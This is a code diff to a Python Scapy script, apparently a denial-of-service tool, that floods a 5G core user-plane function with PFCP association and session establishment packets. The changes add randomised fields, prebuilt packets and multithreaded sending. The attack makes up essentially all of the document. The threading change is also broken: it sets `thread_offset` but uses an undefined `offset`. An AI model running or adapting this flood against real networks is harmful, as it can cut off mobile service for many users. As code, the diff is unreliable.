@@ -1,10 +1,11 @@
-from scapy.all import send, IP, UDP
+from scapy.all import send, IP, UDP, conf
 from scapy.contrib.pfcp import *
 import time, random, ipaddress, threading
 
 
 import sys
 
+conf.verb = 0
 
 EVIL_ADDR = "10.100.200.66" 
 UPF_ADDR  = "10.100.200.2"
@@ -283,20 +284,22 @@ class PFCPDosAttack:
             self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
                 seid=self.new_seid(), 
                 ue_addr=self.new_ue_addr(),
-                teid=self.new_teid()
+                teid=self.new_teid(),
+                random_seq=self.randomize,
+                random_far_number=29
                 ))
         print(f"[DoS] Prepared the PFCP association setup packet")
         print(f"[DoS] Prepared {count} PFCP session establishment packets")
                 
     
-    def pfcp_session_establishment_flood_worker(self, count):
+    def pfcp_session_establishment_flood_worker(self, count, start_index=0):
         if self.verbose:
-            print(f"[DoS][Worker] Worker starts flooding with {count} requests")
+            print(f"[DoS][Worker] Worker starts flooding with {count} requests (offset {start_index})")
             
             
         
         if self.prepare:
-            for i in range(count):
+            for i in range(start_index, start_index+count):
                 send(self.pfcp_establishment_packet_list[i])
         else:
             pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
@@ -333,11 +336,13 @@ class PFCPDosAttack:
         
         send(pfcp_association_packet)
         
+        thread_offset = 0
         for i in range(num_threads):
             count = per_thread + (1 if i < remaining else 0)
-            t = threading.Thread(target=self.pfcp_session_establishment_flood_worker, args=(count,))
+            t = threading.Thread(target=self.pfcp_session_establishment_flood_worker, args=(count, offset))
             t.start()
             threads.append(t)
+            offset += count
 
         for t in threads:
             t.join()
@@ -422,4 +427,5 @@ class PFCPDosAttack:
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
 objet_dos.set_randomize(True)
+objet_dos.set_prepare(True)
 objet_dos.Start_pfcp_session_establishment_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
